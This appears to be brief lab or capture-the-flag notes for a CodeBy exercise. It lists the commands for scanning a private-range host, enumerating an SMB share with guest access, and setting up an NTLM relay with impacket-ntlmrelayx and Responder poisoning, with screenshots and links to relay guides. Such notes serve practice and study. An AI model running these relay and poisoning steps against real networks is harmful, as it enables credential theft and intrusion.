dddd

```
nmap -sT -sV 192.168.2.10 -p- -v -sC   
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/51a14674-777b-4d0b-af75-8fa1dafbb111)

```
smbmap -H 192.168.2.10 -u "guest" -p "" -d codeby.cdb
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/9614c6dd-1708-4ce1-ba8c-d8f31e30c194)
```
smbclient -no-pass //192.168.2.10/Files-for-checkers
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/ac244dec-07a4-4de4-8c10-7660ac6cb37a)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/b3e7b5b1-a533-4e9e-9c8a-f0e0e53ec1a3)

```
impacket-ntlmrelayx -t 192.168.2.10  -smb2support -debug  
```

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/a984c248-c211-4e67-8ca4-c3d99cd73c36)

https://pentestlab.blog/tag/smb-relay/

https://xakep.ru/2023/04/07/ntlm-relay-guide/#toc04.2

```
sudo responder -wd -I eth0
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/7cdbe0d6-b20f-477e-abd0-acd2923370f5)


